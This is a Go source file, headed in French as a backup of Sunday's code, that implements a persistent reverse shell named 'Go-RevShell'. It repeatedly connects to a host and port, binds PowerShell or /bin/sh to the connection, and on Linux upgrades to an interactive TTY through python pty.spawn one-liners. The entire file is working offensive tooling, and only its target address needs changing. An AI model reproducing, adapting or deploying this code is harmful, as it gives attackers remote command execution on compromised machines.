# Sauvegarde du code du dimanche

    package main
    
    import (
    	"net"
    	"os/exec"
    	"runtime"
    	"strconv"
    	"strings"
    	"time"
    )
    
    const banner string = `
      ____                   ____                   ____    _              _   _
     / ___|   ___           |  _ \    ___  __   __ / ___|  | |__     ___  | | | |
    | |  _   / _ \   _____  | |_) |  / _ \ \ \ / / \___ \  | '_ \   / _ \ | | | |
    | |_| | | (_) | |_____| |  _ <  |  __/  \ V /   ___) | | | | | |  __/ | | | |
     \____|  \___/          |_| \_\  \___|   \_/   |____/  |_| |_|  \___| |_| |_|
    
    `
    
    var linuxPayloadsTTY = []string{`/usr/bin/env python -c 'import pty; pty.spawn("/bin/bash")'`, `/usr/bin/env python2.7 -c 'import pty;pty.        spawn("/bin/bash")'`, `/usr/bin/env python3 -c 'import pty; pty.spawn("/bin/bash")'`}
    
    func main() {
    	reverseShell("localhost", 1111)
    }
    
    func reverseShell(host string, port int) {
    	for {
    		connexion, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
    		if err != nil {
    			time.Sleep(2 * time.Second)
    		} else {
    			connexion.Write([]byte(banner + "[+] Connected to " + connexion.LocalAddr().String() + "\nType \"exit\" and press enter to close     the shell properly or the process will die server side.\n"))
    			if runtime.GOOS == "windows" {
    				spawnShell(connexion, "powershell.exe")
    			} else {
    				spawnLinuxTTYShell(connexion, "/bin/sh")
    			}
    			connexion.Close()
    		}
    	}
    }
    
    func spawnShell(connexion net.Conn, shellProgram string, arguments ...string) {
    	shell := exec.Command(shellProgram, arguments...)
    	shell.Stdout, shell.Stderr, shell.Stdin = connexion, connexion, connexion
    	shell.Run()
    }
    
    func spawnLinuxTTYShell(connexion net.Conn, shellProgram string) {
    	payload := findLinuxPayload(connexion, shellProgram)
    	if payload != "" {
    		spawnShell(connexion, shellProgram, "-c", payload)
    	} else {
    		spawnShell(connexion, shellProgram)
    	}
    }
    
    func findLinuxPayload(connexion net.Conn, shellProgram string) string {
    	for _, payload := range linuxPayloadsTTY {
    		err := exec.Command(shellProgram, "-c", strings.Replace(payload, "/bin/bash", "/bin/bash -c exit 0", -1)).Run()
    		if err == nil {
    			return payload
    		}
    	}
    	return ""
    }
